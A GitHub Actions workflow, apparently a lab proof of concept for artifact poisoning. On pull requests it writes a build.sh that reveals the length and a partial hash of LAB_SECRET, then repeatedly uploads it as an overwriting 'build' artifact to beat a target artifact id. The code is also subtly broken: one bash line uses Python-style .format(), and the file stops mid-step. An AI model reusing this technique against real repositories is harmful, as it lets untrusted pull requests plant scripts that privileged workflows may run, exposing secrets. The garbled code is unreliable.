name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - run: |
          mkdir -p dist
          {
            echo "POSITION-RAN-CANARY lane=6 run=${GITHUB_RUN_ID}"
            echo "SEEN_LEN=${#LAB_SECRET}"
            printf %s "$LAB_SECRET" | sha256sum | cut -c1-24 | sed "s/^/SEEN_HASH=/"
          } > dist/build.sh
          echo 'canary payload ready' > dist/marker.txt
          TARGET=$(gh api "/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=1" --jq ".artifacts[0].id")
          echo "TARGET=$TARGET" >> $GITHUB_ENV
      - uses: actions/upload-artifact@v4
        id: u1
        if: env.STOP != 'true'
        with:
          name: build
          path: dist
          overwrite: true
      - run: |
          NEW=${{ steps.u1.outputs.artifact-id }}
          echo "draw=$NEW".format("$NEW")
          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
      - uses: actions/upload-artifact@v4
        id: u2
        if: env.STOP != 'true'
